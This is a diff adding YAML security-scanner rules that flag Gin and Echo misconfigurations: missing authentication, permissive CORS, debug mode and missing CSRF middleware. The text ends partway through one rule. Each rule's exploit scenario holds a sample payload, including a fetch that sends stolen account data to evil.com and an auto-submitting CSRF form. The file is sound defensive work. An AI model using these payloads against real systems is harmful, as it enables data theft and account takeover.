@@ -1,0 +1,1075 @@
+rules:
+- rule_id: FW-GIN-001
+  title: Missing Authentication Middleware on Gin Router Groups
+  description: 'Detects Gin web framework route groups that handle sensitive operations without authentication middleware.
+    Gin uses router groups to organize routes, and middleware is applied per-group. When route groups for administrative,
+    user, or API endpoints lack authentication middleware, all routes within that group become publicly accessible, exposing
+    sensitive functionality to unauthenticated users.
+
+    '
+  language: go
+  category: framework_misuse
+  severity: High
+  confidence: 0.88
+  cwe: CWE-306
+  owasp: A07:2021-Identification and Authentication Failures
+  tags:
+  - gin
+  - authentication
+  - middleware
+  - router-group
+  - go
+  - authorization
+  detection_layer: 4
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: r\.Group\s*\(\s*"\/api"
+    description: API route group without auth middleware
+  - type: regex
+    pattern: router\.Group\s*\(\s*"\/admin"
+    description: Admin route group without auth middleware
+  - type: regex
+    pattern: r\.Group\s*\(\s*"\/users"
+    description: Users route group without auth middleware
+  - type: regex
+    pattern: \.Group\s*\(\s*"[^"]*"\s*\)\s*\n\s*\{?\s*\n\s*\w+\.(GET|POST|PUT|DELETE)\s*\(
+    description: Route group with handlers but no middleware
+  - type: regex
+    pattern: gin\.Default\s*\(\s*\)[\s\S]*?\.Group\s*\([^)]*\)(?![\s\S]*?\.Use\s*\(\s*\w*[Aa]uth)
+    description: Default Gin engine with group lacking auth middleware
+  - type: regex
+    pattern: \.DELETE\s*\(\s*"[^"]*/:id"\s*,\s*\w+\)
+    description: Delete endpoint with ID parameter without auth check
+  - type: regex
+    pattern: \.PUT\s*\(\s*"[^"]*/:id"\s*,\s*\w+\)
+    description: Update endpoint with ID parameter without auth check
+  - type: regex
+    pattern: gin\.New\s*\(\s*\)[\s\S]*?\.Group\s*\([^)]*\)(?![\s\S]*?\.Use\s*\(\s*\w*[Aa]uth)
+    description: New Gin engine with unprotected route group
+  anti_patterns:
+  - \.Use\s*\(\s*\w*[Aa]uth\w*\s*\(\s*\)\s*\)
+  - \.Use\s*\(\s*middleware\.\w*[Aa]uth
+  - \.Use\s*\(\s*jwt\.\w+
+  - \.Use\s*\(\s*gin\.BasicAuth
+  - AuthRequired
+  - JWTAuth
+  - TokenAuth
+  - BearerAuth
+  - c\.GetHeader\s*\(\s*"Authorization"\s*\)
+  - sessions\.Default\s*\(\s*c\s*\)
+  - c\.AbortWithStatus\s*\(\s*401
+  - c\.AbortWithStatusJSON\s*\(\s*401
+  - gin-contrib/sessions
+  - casbin
+  - authMiddleware\.MiddlewareFunc
+  bypass_variants:
+  - description: Auth middleware on parent group but specific route bypasses
+    pattern: \.Group\s*\([^)]*\)\s*\.Use\s*\(\s*\w*Auth[\s\S]*?\.Group\s*\([^)]*\)\s*\.GET
+  - description: Auth check in handler but not in middleware (per-handler auth)
+    pattern: func\s+\w+Handler\s*\(\s*c\s+\*gin\.Context\s*\)\s*\{[\s\S]*?if\s+.*token.*\{[\s\S]*?c\.JSON
+  - description: Auth middleware added conditionally based on environment
+    pattern: if\s+os\.Getenv\s*\(\s*"[^"]*"\s*\)\s*!=\s*""\s*\{[\s\S]*?\.Use\s*\(\s*\w*Auth
+  evasion_indicators:
+  - Authentication handled at API gateway level not visible in application
+  - Custom middleware with auth-like name but permissive implementation
+  - Auth middleware registered globally but removed for specific groups
+  encoding_variants:
+  - type: variable_group
+    pattern: path\s*:=\s*"\/api"[\s\S]*?\.Group\s*\(\s*path\s*\)
+  - type: method_chain
+    pattern: r\.Group\s*\([^)]+\)[\s\S]*?\.Use\s*\(\s*gin\.Logger\s*\(\s*\)\s*\)(?![\s\S]*?[Aa]uth)
+  multi_function_chain_patterns:
+  - gin.Default() -> r.Group('/api') -> .GET('/users', listUsers) [no auth] -> data leak
+  - gin.New() -> r.Group('/admin') -> .DELETE('/users/:id', deleteUser) [no auth] -> data loss
+  - gin.Default() -> r.Group('/api/v1') -> .PUT('/config', updateConfig) [no auth] -> config tampering
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: true
+    escalation_vector: Unauthenticated access to API groups enables full data access and modification
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Unauthenticated HTTP request
+    sink: Gin handler function for sensitive operation
+    through: Route group without authentication middleware
+  impact: 'Missing authentication middleware on Gin route groups exposes all
+
+    routes within the group to unauthenticated access. Attackers can
+
+    read sensitive data, modify records, delete resources, and perform
+
+    administrative operations without any credentials. Since Gin route
+
+    groups often organize related API endpoints, a single missing
+
+    middleware call can expose an entire feature area.
+
+    '
+  remediation: "Apply authentication middleware to all sensitive route groups:\n\n```go\npackage main\n\nimport (\n    \"\
+    github.com/gin-gonic/gin\"\n    \"myapp/middleware\"\n)\n\nfunc main() {\n    r := gin.Default()\n\n    // Public routes\
+    \ (no auth required)\n    public := r.Group(\"/public\")\n    {\n        public.GET(\"/health\", healthCheck)\n      \
+    \  public.POST(\"/login\", loginHandler)\n    }\n\n    // Protected routes (auth required)\n    api := r.Group(\"/api\"\
+    )\n    api.Use(middleware.AuthRequired())\n    {\n        api.GET(\"/users\", listUsers)\n        api.GET(\"/users/:id\"\
+    , getUser)\n    }\n\n    // Admin routes (auth + admin role required)\n    admin := r.Group(\"/admin\")\n    admin.Use(middleware.AuthRequired(),\
+    \ middleware.AdminRequired())\n    {\n        admin.DELETE(\"/users/:id\", deleteUser)\n        admin.PUT(\"/config\"\
+    , updateConfig)\n    }\n\n    r.Run(\":8080\")\n}\n```\n"
+  references:
+  - https://gin-gonic.com/docs/examples/using-middleware/
+  - https://gin-gonic.com/docs/examples/grouping-routes/
+  - https://cwe.mitre.org/data/definitions/306.html
+  - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
+  context_awareness:
+    surrounding_context_patterns:
+    - gin\.Default\s*\(\s*\)
+    - gin\.New\s*\(\s*\)
+    - \.Group\s*\(
+    - \.Use\s*\(
+    taint_source_indicators:
+    - c\.Query\s*\(
+    - c\.Param\s*\(
+    - c\.PostForm\s*\(
+    - c\.BindJSON\s*\(
+    taint_sink_indicators:
+    - c\.JSON\s*\(
+    - c\.String\s*\(
+    - db\.\w+\s*\(
+    sanitization_patterns:
+    - \.Use\s*\(\s*\w*Auth
+    - c\.AbortWithStatus\s*\(\s*401
+    - c\.GetHeader\s*\(\s*"Authorization"
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: 'severity_weight * confidence * (admin_group ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Gin API has route groups for /api/users and /api/admin. The
+
+      developer applies auth middleware to /api/users but forgets to
+
+      add it to /api/admin. An attacker discovers /api/admin/users
+
+      endpoints and sends unauthenticated requests to list all users,
+
+      delete accounts, and modify permissions. Without authentication
+
+      middleware, all admin operations are publicly accessible.
+
+      '
+    example_payload: curl -X DELETE https://target.com/api/admin/users/1
+    attacker_objective: Access admin functionality through unprotected Gin route groups
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-GIN-002
+    - FW-GIN-003
+    - FW-ECHO-001
+- rule_id: FW-GIN-002
+  title: Insecure CORS Configuration in Gin Application
+  description: 'Detects Gin applications that configure CORS with overly permissive settings using the gin-contrib/cors package
+    or manual header setting. This includes wildcard origins, reflecting all origins, allowing all methods and headers, or
+    combining wildcards with credentials. Permissive CORS in Go APIs enables cross-origin data theft and CSRF bypass.
+
+    '
+  language: go
+  category: framework_misuse
+  severity: High
+  confidence: 0.87
+  cwe: CWE-942
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - gin
+  - cors
+  - cross-origin
+  - misconfiguration
+  - api-security
+  - go
+  detection_layer: 4
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: cors\.Default\s*\(\s*\)
+    description: Default CORS config (allows all origins)
+  - type: regex
+    pattern: AllowAllOrigins\s*:\s*true
+    description: CORS explicitly allowing all origins
+  - type: regex
+    pattern: AllowOrigins\s*:\s*\[\s*"\*"\s*\]
+    description: CORS with wildcard origin in list
+  - type: regex
+    pattern: AllowCredentials\s*:\s*true[\s\S]*?AllowAllOrigins\s*:\s*true
+    description: Credentials with all origins (maximum risk)
+  - type: regex
+    pattern: AllowOriginFunc\s*:\s*func\s*\(\s*\w+\s+string\s*\)\s*bool\s*\{\s*return\s+true
+    description: Origin function always returning true
+  - type: regex
+    pattern: c\.Header\s*\(\s*"Access-Control-Allow-Origin"\s*,\s*"\*"\s*\)
+    description: Manual wildcard ACAO header
+  - type: regex
+    pattern: c\.Writer\.Header\s*\(\s*\)\s*\.Set\s*\(\s*"Access-Control-Allow-Origin"\s*,\s*"\*"\s*\)
+    description: Writer header set to wildcard ACAO
+  - type: regex
+    pattern: AllowMethods\s*:\s*\[\s*"\*"\s*\]
+    description: All HTTP methods allowed
+  anti_patterns:
+  - AllowOrigins\s*:\s*\[\s*"https?://[\w.-]+
+  - AllowAllOrigins\s*:\s*false
+  - AllowOriginFunc\s*:\s*func\s*\(\s*origin\s+string\s*\)\s*bool\s*\{[\s\S]*?allowedOrigins
+  - AllowOrigins\s*:\s*\[\s*os\.Getenv
+  - isAllowedOrigin\s*\(
+  - slices\.Contains\s*\(\s*allowedOrigins
+  - AllowCredentials\s*:\s*false
+  - AllowOrigins\s*:\s*config\.
+  - cors\.Config\s*\{[\s\S]*?AllowOrigins\s*:\s*\[\s*"https://
+  - AllowOriginFunc[\s\S]*?strings\.HasSuffix
+  - cors\.New\s*\(\s*cors\.Config\s*\{[\s\S]*?AllowOrigins\s*:\s*\[\s*"https
+  - originWhitelist
+  - allowedDomains
+  - os\.Getenv\s*\(\s*"CORS_ORIGINS"\s*\)
+  - viper\.GetStringSlice\s*\(\s*"cors\.origins"\s*\)
+  bypass_variants:
+  - description: Origin function uses string Contains instead of exact match
+    pattern: AllowOriginFunc[\s\S]*?strings\.Contains\s*\(\s*origin
+  - description: CORS configured for router but manual headers override
+    pattern: cors\.New[\s\S]*?c\.Header\s*\(\s*"Access-Control-Allow-Origin"\s*,\s*"\*"
+  - description: Origin validation with suffix check vulnerable to subdomain bypass
+    pattern: AllowOriginFunc[\s\S]*?strings\.HasSuffix\s*\(\s*origin\s*,\s*"\.example\.com"
+  evasion_indicators:
+  - CORS configuration loaded from environment with wildcard default
+  - Multiple CORS configs for different route groups with inconsistent settings
+  - Custom CORS middleware that bypasses gin-contrib/cors
+  encoding_variants:
+  - type: env_config
+    pattern: os\.Getenv\s*\(\s*"CORS_ORIGIN"\s*\)[\s\S]*?AllowAllOrigins
+  - type: viper_config
+    pattern: viper\.GetBool\s*\(\s*"cors\.allowAll"\s*\)
+  multi_function_chain_patterns:
+  - cors.Default() -> r.Use(corsMiddleware) -> all endpoints exposed cross-origin
+  - 'AllowAllOrigins: true -> AllowCredentials: true -> session cookie theft'
+  - AllowOriginFunc returning true -> authenticated endpoints -> data exfiltration
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Permissive CORS enables cross-origin credential theft from authenticated sessions
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Cross-origin request from attacker's domain
+    sink: Authenticated Gin handler response
+    through: Permissive CORS configuration
+  impact: 'Overly permissive CORS configuration allows any website to make
+
+    cross-origin requests to the Gin API. When AllowCredentials is true,
+
+    the attacker''s page can include the victim''s cookies, enabling theft
+
+    of authenticated API responses. This effectively bypasses same-origin
+
+    policy and enables data exfiltration, unauthorized API access, and
+
+    CSRF attacks against the Go backend.
+
+    '
+  remediation: "Configure CORS with explicit origin whitelist:\n\n```go\nimport \"github.com/gin-contrib/cors\"\n\nfunc setupRouter()\
+    \ *gin.Engine {\n    r := gin.Default()\n\n    r.Use(cors.New(cors.Config{\n        AllowOrigins: []string{\n        \
+    \    \"https://app.example.com\",\n            \"https://admin.example.com\",\n        },\n        AllowMethods:     []string{\"\
+    GET\", \"POST\", \"PUT\", \"DELETE\"},\n        AllowHeaders:     []string{\"Content-Type\", \"Authorization\"},\n   \
+    \     AllowCredentials: true,\n        MaxAge:           12 * time.Hour,\n    }))\n\n    return r\n}\n```\n"
+  references:
+  - https://github.com/gin-contrib/cors
+  - https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+  - https://cwe.mitre.org/data/definitions/942.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - gin-contrib/cors
+    - cors\.New\s*\(
+    - cors\.Default\s*\(
+    - cors\.Config\s*\{
+    taint_source_indicators:
+    - c\.GetHeader\s*\(\s*"Origin"\s*\)
+    - c\.Request\.Header\.Get\s*\(\s*"Origin"\s*\)
+    taint_sink_indicators:
+    - c\.Header\s*\(\s*"Access-Control-Allow-Origin"
+    - AllowAllOrigins
+    - AllowOrigins
+    sanitization_patterns:
+    - AllowOrigins\s*:\s*\[\s*"https://
+    - AllowAllOrigins\s*:\s*false
+    - isAllowedOrigin\s*\(
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: 'severity_weight * confidence * (credentials_allowed ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Gin API uses cors.Default() which allows all origins. The API
+
+      handles financial transactions with JWT tokens stored in cookies.
+
+      An attacker creates evil.com with JavaScript that makes fetch
+
+      requests to the Gin API with credentials:''include''. The victim
+
+      visits evil.com while logged into the API. The attacker reads
+
+      the response containing account balance and transaction history,
+
+      then initiates unauthorized transfers.
+
+      '
+    example_payload: fetch('https://api.target.com/account/balance',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/exfil',{method:'POST',body:JSON.stringify(d)}))
+    attacker_objective: Steal authenticated API responses via cross-origin requests due to permissive CORS
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-GIN-001
+    - FW-GIN-003
+    - FW-ECHO-002
+    - FW-EXPRESS-002
+- rule_id: FW-GIN-003
+  title: Gin Debug Mode Enabled in Production
+  description: 'Detects Gin applications running in debug mode (gin.DebugMode) in production deployments. Debug mode enables
+    verbose logging of all routes, request details, and internal framework operations. It also disables certain performance
+    optimizations and can expose route structure, middleware chain details, and internal error messages to attackers who trigger
+    errors or observe response headers.
+
+    '
+  language: go
+  category: framework_misuse
+  severity: Medium
+  confidence: 0.84
+  cwe: CWE-489
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - gin
+  - debug
+  - information-disclosure
+  - misconfiguration
+  - production
+  - go
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: gin\.SetMode\s*\(\s*gin\.DebugMode\s*\)
+    description: Gin explicitly set to debug mode
+  - type: regex
+    pattern: GIN_MODE\s*=\s*debug
+    description: GIN_MODE environment variable set to debug
+  - type: regex
+    pattern: gin\.Default\s*\(\s*\)(?![\s\S]*?gin\.SetMode\s*\(\s*gin\.ReleaseMode)
+    description: Gin Default without SetMode to release
+  - type: regex
+    pattern: gin\.New\s*\(\s*\)(?![\s\S]*?gin\.SetMode\s*\(\s*gin\.ReleaseMode)
+    description: Gin New without release mode configuration
+  - type: regex
+    pattern: os\.Setenv\s*\(\s*"GIN_MODE"\s*,\s*"debug"\s*\)
+    description: GIN_MODE set to debug via os.Setenv
+  - type: regex
+    pattern: gin\.IsDebugging\s*\(\s*\)
+    description: Debug mode check indicating debug code paths
+  anti_patterns:
+  - gin\.SetMode\s*\(\s*gin\.ReleaseMode\s*\)
+  - gin\.SetMode\s*\(\s*gin\.TestMode\s*\)
+  - GIN_MODE\s*=\s*release
+  - os\.Setenv\s*\(\s*"GIN_MODE"\s*,\s*"release"\s*\)
+  - gin\.Mode\s*\(\s*\)\s*==\s*gin\.ReleaseMode
+  - if\s+gin\.IsDebugging\s*\(\s*\)\s*\{[\s\S]*?\}
+  - gin\.DisableConsoleColor\s*\(\s*\)
+  - ReleaseMode
+  - config\.Mode\s*==\s*"release"
+  - viper\.GetString\s*\(\s*"gin\.mode"\s*\)\s*==\s*"release"
+  - productionMode
+  - gin\.SetMode\s*\(\s*os\.Getenv\s*\(\s*"GIN_MODE"\s*\)\s*\)
+  - flag\.String.*gin.*mode.*release
+  - env\.Get.*GIN_MODE.*release
+  - zerolog
+  bypass_variants:
+  - description: Release mode set conditionally but condition evaluates to debug
+    pattern: if\s+os\.Getenv\s*\(\s*"ENV"\s*\)\s*==\s*"production"[\s\S]*?gin\.SetMode\s*\(\s*gin\.ReleaseMode[\s\S]*?else[\s\S]*?gin\.DebugMode
+  - description: Mode set from environment but defaults to debug
+    pattern: mode\s*:=\s*os\.Getenv\s*\(\s*"GIN_MODE"\s*\)\s*\n\s*if\s+mode\s*==\s*""\s*\{\s*mode\s*=\s*"debug"
+  - description: Release mode set but debug logging middleware still active
+    pattern: gin\.SetMode\s*\(\s*gin\.ReleaseMode[\s\S]*?\.Use\s*\(\s*gin\.Logger\s*\(\s*\)
+  evasion_indicators:
+  - GIN_MODE environment variable not set in deployment manifests
+  - Docker image built without GIN_MODE=release
+  - Kubernetes deployment missing GIN_MODE environment variable
+  encoding_variants:
+  - type: env_default
+    pattern: os\.Getenv\s*\(\s*"GIN_MODE"\s*\)[\s\S]*?if.*"".*debug
+  - type: config_file
+    pattern: gin_mode:\s*debug
+  multi_function_chain_patterns:
+  - gin.DebugMode -> verbose route logging -> route structure revealed
+  - gin.DebugMode -> error handler -> detailed error in response
+  - gin.DebugMode -> request logging -> sensitive data in logs
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Debug mode reveals route structure and internal details aiding attack planning
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Application startup and request handling
+    sink: Verbose debug output and error responses
+    through: Gin debug mode configuration
+  impact: 'Gin debug mode in production logs all registered routes with their
+
+    handlers on startup, making route discovery trivial for attackers
+
+    with access to logs. Debug mode also outputs detailed request/response
+
+    information, may include verbose error messages in responses, and
+
+    disables performance optimizations. While less critical than Flask or
+
+    Django debug modes, it still constitutes information disclosure and
+
+    security misconfiguration.
+
+    '
+  remediation: "Set Gin to release mode in production:\n\n```go\npackage main\n\nimport (\n    \"os\"\n    \"github.com/gin-gonic/gin\"\
+    \n)\n\nfunc main() {\n    // Option 1: Set directly in code\n    gin.SetMode(gin.ReleaseMode)\n\n    // Option 2: Set\
+    \ via environment variable\n    // export GIN_MODE=release\n\n    // Option 3: Set based on environment\n    if os.Getenv(\"\
+    APP_ENV\") == \"production\" {\n        gin.SetMode(gin.ReleaseMode)\n        gin.DisableConsoleColor()\n    }\n\n   \
+    \ r := gin.New() // Use gin.New() instead of gin.Default() in production\n    r.Use(gin.Recovery()) // Keep recovery but\
+    \ not logger\n\n    // Use structured logging instead of gin.Logger()\n    r.Use(structuredLoggerMiddleware())\n\n   \
+    \ r.Run(\":8080\")\n}\n```\n"
+  references:
+  - https://gin-gonic.com/docs/introduction/
+  - https://pkg.go.dev/github.com/gin-gonic/gin#SetMode
+  - https://cwe.mitre.org/data/definitions/489.html
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  context_awareness:
+    surrounding_context_patterns:
+    - gin\.Default\s*\(
+    - gin\.New\s*\(
+    - gin\.SetMode\s*\(
+    - GIN_MODE
+    taint_source_indicators:
+    - c\.Query\s*\(
+    - c\.Param\s*\(
+    - c\.PostForm\s*\(
+    taint_sink_indicators:
+    - log\.Printf
+    - fmt\.Printf
+    - c\.JSON\s*\(\s*500
+    sanitization_patterns:
+    - gin\.SetMode\s*\(\s*gin\.ReleaseMode\s*\)
+    - GIN_MODE\s*=\s*release
+  severity_scoring:
+    severity_weight: 5
+    risk_score_formula_hint: 'severity_weight * confidence * (internet_exposed ? 1.3 : 1.0)'
+    exploitability_score: Low
+  exploit_scenario:
+    attack_example: 'A Gin application runs in debug mode in production. An attacker
+
+      sends an intentionally malformed request that triggers a panic.
+
+      The debug-mode recovery middleware returns detailed error
+
+      information including the stack trace, function names, and file
+
+      paths. The attacker uses this information to map the application
+
+      structure, identify vulnerable handler functions, and craft
+
+      targeted exploits against specific endpoints.
+
+      '
+    example_payload: 'curl -X POST https://target.com/api/users -H ''Content-Type: application/json'' -d ''{invalid'''
+    attacker_objective: Gather application internals from debug output to plan targeted attacks
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: low
+    sanitization_absence: medium
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: false
+    high_impact_flag: false
+    related_rules:
+    - FW-GIN-001
+    - FW-GIN-002
+    - FW-ECHO-003
+- rule_id: FW-ECHO-001
+  title: Missing CSRF Middleware in Echo Application
+  description: 'Detects Echo web framework applications that handle state-changing requests (POST, PUT, DELETE) without CSRF
+    middleware. Echo does not enable CSRF protection by default, and the middleware must be explicitly added. Without CSRF
+    protection, forms and API endpoints that use cookie-based authentication are vulnerable to cross-site request forgery
+    attacks.
+
+    '
+  language: go
+  category: framework_misuse
+  severity: Medium
+  confidence: 0.81
+  cwe: CWE-352
+  owasp: A01:2021-Broken Access Control
+  tags:
+  - echo
+  - csrf
+  - middleware
+  - session-riding
+  - go
+  - security
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: echo\.New\s*\(\s*\)[\s\S]*?\.POST\s*\([^)]*\)(?![\s\S]*?middleware\.CSRF)
+    description: Echo app with POST routes but no CSRF middleware
+  - type: regex
+    pattern: echo\.New\s*\(\s*\)[\s\S]*?\.PUT\s*\([^)]*\)(?![\s\S]*?middleware\.CSRF)
+    description: Echo app with PUT routes but no CSRF middleware
+  - type: regex
+    pattern: echo\.New\s*\(\s*\)[\s\S]*?\.DELETE\s*\([^)]*\)(?![\s\S]*?middleware\.CSRF)
+    description: Echo app with DELETE routes but no CSRF middleware
+  - type: regex
+    pattern: e\s*:=\s*echo\.New\s*\(\s*\)[\s\S]*?e\.Start(?![\s\S]*?CSRF)
+    description: Echo server started without CSRF middleware
+  - type: regex
+    pattern: \.POST\s*\(\s*"\/\w+"\s*,\s*\w+Handler\s*\)(?![\s\S]*?csrf)
+    description: POST handler registered without CSRF protection
+  - type: regex
+    pattern: e\.Group\s*\(\s*"[^"]*"\s*\)[\s\S]*?\.POST(?![\s\S]*?CSRF)
+    description: Echo group with POST endpoints without CSRF
+  - type: regex
+    pattern: echo\.New\s*\(\s*\)[\s\S]*?middleware\.Session(?![\s\S]*?middleware\.CSRF)
+    description: Session middleware without CSRF (cookie-based auth without CSRF)
+  - type: regex
+    pattern: e\.Use\s*\(\s*middleware\.Logger\s*\(\s*\)\s*\)[\s\S]*?e\.Use\s*\(\s*middleware\.Recover\s*\(\s*\)\s*\)(?![\s\S]*?CSRF)
+    description: Standard middleware stack without CSRF
+  anti_patterns:
+  - middleware\.CSRF\s*\(\s*\)
+  - middleware\.CSRFWithConfig\s*\(
+  - e\.Use\s*\(\s*middleware\.CSRF
+  - csrf\.Token\s*\(
+  - csrf\.Middleware\s*\(
+  - X-CSRF-Token
+  - X-XSRF-Token
+  - _csrf
+  - csrfMiddleware
+  - middleware\.CSRFConfig\s*\{
+  - CookieSameSite.*Strict
+  - echo-csrf
+  - gorilla/csrf
+  - nosurf
+  - csrf\.Protect\s*\(
+  bypass_variants:
+  - description: CSRF middleware added but skipped for specific paths
+    pattern: CSRFWithConfig\s*\(\s*middleware\.CSRFConfig\s*\{[\s\S]*?Skipper.*func.*true
+  - description: CSRF token validated but not regenerated after login
+    pattern: middleware\.CSRF[\s\S]*?loginHandler(?![\s\S]*?RegenerateCSRFToken)
+  - description: CSRF middleware present but using GET-based token (leakable)
+    pattern: middleware\.CSRFConfig\s*\{[\s\S]*?TokenLookup.*query
+  evasion_indicators:
+  - CSRF protection handled by frontend framework but not validated server-side
+  - SameSite cookie attribute used instead of CSRF tokens
+  - Custom CSRF implementation that does not properly validate tokens
+  encoding_variants:
+  - type: custom_header
+    pattern: TokenLookup\s*:\s*"header:X-Custom-CSRF"
+  - type: cookie_token
+    pattern: TokenLookup\s*:\s*"cookie:_csrf"
+  multi_function_chain_patterns:
+  - echo.New() -> session middleware -> POST /transfer -> no CSRF -> money theft
+  - echo.New() -> cookie auth -> POST /account/update -> no CSRF -> account takeover
+  - echo.New() -> JWT in cookie -> DELETE /resource -> no CSRF -> data deletion
+  privilege_context_flags:
+    requires_auth_context: true
+    admin_only_risk: false
+    escalation_vector: CSRF enables attackers to perform actions as any authenticated user
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: false
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: Cross-origin form submission or XHR request
+    sink: Echo handler for state-changing operation
+    through: Missing CSRF middleware in Echo middleware stack
+  impact: 'Without CSRF middleware, Echo applications using cookie-based or
+
+    session-based authentication are vulnerable to cross-site request
+
+    forgery attacks. Attackers can create malicious pages that submit
+
+    forms to the Echo API, executing state-changing operations with
+
+    the victim''s session. This enables unauthorized fund transfers,
+
+    account modifications, data deletion, and privilege changes.
+
+    '
+  remediation: "Add CSRF middleware to the Echo application:\n\n```go\npackage main\n\nimport (\n    \"github.com/labstack/echo/v4\"\
+    \n    \"github.com/labstack/echo/v4/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n\n    // Add CSRF middleware\n\
+    \    e.Use(middleware.CSRFWithConfig(middleware.CSRFConfig{\n        TokenLookup:    \"header:X-CSRF-Token\",\n      \
+    \  CookieName:     \"_csrf\",\n        CookiePath:     \"/\",\n        CookieSecure:   true,\n        CookieHTTPOnly:\
+    \ true,\n        CookieSameSite: http.SameSiteStrictMode,\n    }))\n\n    // For forms, include the CSRF token\n    e.POST(\"\
+    /form\", func(c echo.Context) error {\n        token := c.Get(\"csrf\").(string)\n        // Include token in form template\n\
+    \        return c.Render(200, \"form\", map[string]interface{}{\n            \"csrf\": token,\n        })\n    })\n\n\
+    \    e.Start(\":8080\")\n}\n```\n"
+  references:
+  - https://echo.labstack.com/docs/middleware/csrf
+  - https://cwe.mitre.org/data/definitions/352.html
+  - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - echo\.New\s*\(\s*\)
+    - e\.Use\s*\(
+    - \.POST\s*\(
+    - \.PUT\s*\(
+    taint_source_indicators:
+    - c\.FormValue\s*\(
+    - c\.Bind\s*\(
+    - c\.Request\s*\(\s*\)\.Body
+    taint_sink_indicators:
+    - db\.\w+\s*\(
+    - \.Save\s*\(
+    - \.Delete\s*\(
+    - \.Update\s*\(
+    sanitization_patterns:
+    - middleware\.CSRF
+    - CSRFWithConfig
+    - X-CSRF-Token
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (cookie_auth ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An Echo application uses session-based authentication stored in
+
+      cookies and has POST endpoints for account management without CSRF
+
+      protection. An attacker creates a malicious HTML page with a form
+
+      that auto-submits a POST request to /account/change-email with
+
+      the attacker''s email. When an authenticated user visits the page,
+
+      their browser sends the session cookie automatically, and the
+
+      email change is processed, enabling account takeover.
+
+      '
+    example_payload: <form action="https://target.com/account/change-email" method="POST"><input type="hidden" name="email"
+      value="attacker@evil.com"/></form><script>document.forms[0].submit();</script>
+    attacker_objective: Execute state-changing requests as authenticated users through CSRF exploitation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-ECHO-002
+    - FW-ECHO-003
+    - FW-SYMFONY-002
+    - FW-ASPNET-001
+- rule_id: FW-ECHO-002
+  title: Permissive CORS Configuration in Echo Application
+  description: 'Detects Echo framework applications with overly permissive CORS configurations using the echo middleware.CORSWithConfig
+    or manual header setting. This includes wildcard origins, allowing all methods and headers, or reflecting any origin with
+    credentials. Permissive CORS in Echo APIs exposes authenticated endpoints to cross-origin data theft.
+
+    '
+  language: go
+  category: framework_misuse
+  severity: High
+  confidence: 0.87
+  cwe: CWE-942
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - echo
+  - cors
+  - cross-origin
+  - misconfiguration
+  - api-security
+  - go
+  detection_layer: 4
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: middleware\.CORS\s*\(\s*\)
+    description: Default Echo CORS middleware (allows all)
+  - type: regex
+    pattern: AllowOrigins\s*:\s*\[\s*"\*"\s*\]
+    description: CORS with wildcard origin
+  - type: regex
+    pattern: AllowOrigins\s*:\s*\[\s*"\*"\s*,?
+    description: CORS origin list starting with wildcard
+  - type: regex
